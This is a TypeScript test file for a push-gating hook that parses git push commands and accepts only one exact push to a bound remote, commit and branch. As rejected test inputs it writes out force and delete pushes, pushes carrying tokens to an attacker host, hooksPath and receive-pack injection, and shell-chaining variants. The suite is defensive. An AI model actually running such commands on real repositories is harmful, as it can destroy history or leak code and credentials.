/**
 * Issue #2108 §2 — structural exact-push intent parser: the full
 * accept/reject taxonomy. The accepted grammar must remain IDENTICAL to the
 * pre-#2108 single-regex defense (the pinned completion-publish suite pins
 * the same accepted/rejected set end-to-end).
 */
import { describe, expect, test } from 'bun:test';
import { _test_exports } from '../../../src/hooks/pr-workflow-gate.js';

const ARMED = {
	remoteName: 'origin',
	remoteBranchRef: 'refs/heads/pr-head',
	localHead: 'def4567890abcdefdef4567890abcdefdef45678',
};

const EXACT = `git push origin ${ARMED.localHead}:refs/heads/pr-head`;

describe('parseExactBoundPushIntent (issue #2108 exact-intent taxonomy)', () => {
	test('accepts the exact armed push and produces intent + digest', () => {
		const parsed = _test_exports.parseExactBoundPushIntent(EXACT, ARMED);
		expect(parsed.ok).toBe(true);
		expect(parsed.intent).toEqual({
			remote: 'origin',
			sourceSha: ARMED.localHead,
			destRef: 'refs/heads/pr-head',
		});
		expect(parsed.digest).toMatch(/^[0-9a-f]{64}$/);
	});

	test('case variants of the git keyword remain accepted', () => {
		for (const command of [
			`GIT push origin ${ARMED.localHead}:refs/heads/pr-head`,
			`Git PUSH origin ${ARMED.localHead}:refs/heads/pr-head`,
		]) {
			expect(_test_exports.parseExactBoundPushIntent(command, ARMED).ok).toBe(
				true,
			);
		}
	});

	test('rejects force and force-with-lease variants', () => {
		// The reason depends on token position (extra tokens vs flag in the
		// remote/refspec slot); every variant is rejected either way.
		const rejections: Array<[string, string]> = [
			[`git push --force origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push -f origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push --force-with-lease origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push --force-with-lease=other ${ARMED.localHead}:refs/heads/pr-head`, 'flag-or-option'],
			[`git push origin -f ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push origin --force ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push origin ${ARMED.localHead}:refs/heads/pr-head -f`, 'token-shape'],
			[`git push origin --force`, 'flag-or-option'],
		];
		for (const [command, reason] of rejections) {
			const parsed = _test_exports.parseExactBoundPushIntent(command, ARMED);
			expect(parsed.ok).toBe(false);
			expect([command, parsed.reason]).toEqual([command, reason]);
		}
	});

	test('rejects delete, tag, wildcard, mirror, all, and multi-refspec forms', () => {
		const rejections: Array<[string, string]> = [
			[`git push origin :refs/heads/pr-head`, 'delete-refspec'],
			[`git push origin --delete pr-head`, 'token-shape'],
			[
				`git push origin ${ARMED.localHead}:refs/tags/v1`,
				'invalid-dest-ref',
			],
			[`git push origin --tags`, 'flag-or-option'],
			[`git push --mirror origin`, 'flag-or-option'],
			[`git push origin --all`, 'flag-or-option'],
			[
				`git push origin ${ARMED.localHead}:refs/heads/pr-head ${ARMED.localHead}:refs/heads/other`,
				'token-shape',
			],
			[
				`git push origin refs/heads/pr-head:refs/heads/other`,
				'source-mismatch',
			],
			[
				`git push origin "*:refs/heads/pr-head"`,
				'token-shape',
			],
			[
				`git push origin ${ARMED.localHead}:refs/heads/*`,
				'wildcard-refspec',
			],
			[`git push origin HEAD:refs/heads/pr-head`, 'source-mismatch'],
			[`git push origin ${ARMED.localHead}`, 'invalid-dest-ref'],
		];
		for (const [command, reason] of rejections) {
			const parsed = _test_exports.parseExactBoundPushIntent(command, ARMED);
			expect(parsed.ok).toBe(false);
			expect([command, parsed.reason]).toEqual([command, reason]);
		}
	});

	test('rejects alternate remote, alternate branch, and source mismatch', () => {
		const rejections: Array<[string, string]> = [
			[`git push other ${ARMED.localHead}:refs/heads/pr-head`, 'remote-mismatch'],
			[`git push upstream ${ARMED.localHead}:refs/heads/pr-head`, 'remote-mismatch'],
			[
				`git push origin ${ARMED.localHead}:refs/heads/PR-HEAD`,
				'branch-mismatch',
			],
			[
				`git push origin ${ARMED.localHead}:refs/heads/unrelated`,
				'branch-mismatch',
			],
			[
				`git push origin ${'0'.repeat(40)}:refs/heads/pr-head`,
				'source-mismatch',
			],
		];
		for (const [command, reason] of rejections) {
			const parsed = _test_exports.parseExactBoundPushIntent(command, ARMED);
			expect(parsed.ok).toBe(false);
			expect([command, parsed.reason]).toEqual([command, reason]);
		}
	});

	test('case-distinct remote and branch names cannot bypass the comparison', () => {
		expect(
			_test_exports.parseExactBoundPushIntent(
				`git push Origin ${ARMED.localHead}:refs/heads/pr-head`,
				ARMED,
			).reason,
		).toBe('remote-mismatch');
		expect(
			_test_exports.parseExactBoundPushIntent(
				`git push origin ${ARMED.localHead}:refs/heads/PR-head`,
				ARMED,
			).reason,
		).toBe('branch-mismatch');
	});

	test('rejects credential-bearing and URL remote forms', () => {
		for (const command of [
			`git push https://user:tok@evil.example/repo.git ${ARMED.localHead}:refs/heads/pr-head`,
			`git push https://x-oauth-token@evil.example ${ARMED.localHead}:refs/heads/pr-head`,
			`git push git@github.com:org/repo.git ${ARMED.localHead}:refs/heads/pr-head`,
			`git push ssh://git@evil.example ${ARMED.localHead}:refs/heads/pr-head`,
			`git push user@host:path ${ARMED.localHead}:refs/heads/pr-head`,
		]) {
			const parsed = _test_exports.parseExactBoundPushIntent(command, ARMED);
			expect(parsed.ok).toBe(false);
			expect([command, parsed.reason]).toEqual([
				command,
				'credential-bearing-remote',
			]);
		}
	});

	test('rejects config injection, repo override, and push-option flags', () => {
		const rejections: Array<[string, string]> = [
			[`git push -c core.hooksPath=/tmp/evil origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push --repo=https://evil.example origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push --exec=evil-receive-pack origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push --receive-pack=evil origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push --push-option=x origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push -u origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push --atomic origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push --prune origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push --follow-tags origin ${ARMED.localHead}:refs/heads/pr-head`, 'token-shape'],
			[`git push origin --push-option=x`, 'flag-or-option'],
			[`git push --repo=https://evil.example`, 'token-shape'],
			[`git push -c core.hooksPath=/tmp/evil`, 'flag-or-option'],
		];
		for (const [command, reason] of rejections) {
			const parsed = _test_exports.parseExactBoundPushIntent(command, ARMED);
			expect(parsed.ok).toBe(false);
			expect([command, parsed.reason]).toEqual([command, reason]);
		}
	});

	test('rejects shell wrappers, redirection, control operators, substitution', () => {
		for (const command of [
			`sh -c "git push origin ${ARMED.localHead}:refs/heads/pr-head"`,
			`bash -lc "git push origin ${ARMED.localHead}:refs/heads/pr-head"`,
			`git push origin ${ARMED.localHead}:refs/heads/pr-head > out.txt`,
			`git push origin ${ARMED.localHead}:refs/heads/pr-head 2>&1`,
			`git push origin ${ARMED.localHead}:refs/heads/pr-head; echo done`,
			`git push origin ${ARMED.localHead}:refs/heads/pr-head && echo done`,
			`git push origin ${ARMED.localHead}:refs/heads/pr-head | tee log`,
			`git push origin $(printf ${ARMED.localHead}):refs/heads/pr-head`,
			'`git push origin x:y`',
			`GIT_SSH_COMMAND=evil git push origin ${ARMED.localHead}:refs/heads/pr-head`,
			`git push "origin" ${ARMED.localHead}:refs/heads/pr-head`,
			`git -C . push origin ${ARMED.localHead}:refs/heads/pr-head`,
			`cd . && git push origin ${ARMED.localHead}:refs/heads/pr-head`,
		]) {
			const parsed = _test_exports.parseExactBoundPushIntent(command, ARMED);
			expect(parsed.ok).toBe(false);
			expect(parsed.reason).toBeDefined();
		}
	});

	test('rejects an unbound target record', () => {
		const parsed = _test_exports.parseExactBoundPushIntent(EXACT, {
			remoteName: 'origin',
			remoteBranchRef: 'refs/remotes/not-a-branch',
			localHead: ARMED.localHead,
		});
		expect(parsed.ok).toBe(false);
		expect(parsed.reason).toBe('unbound-target');
	});
});
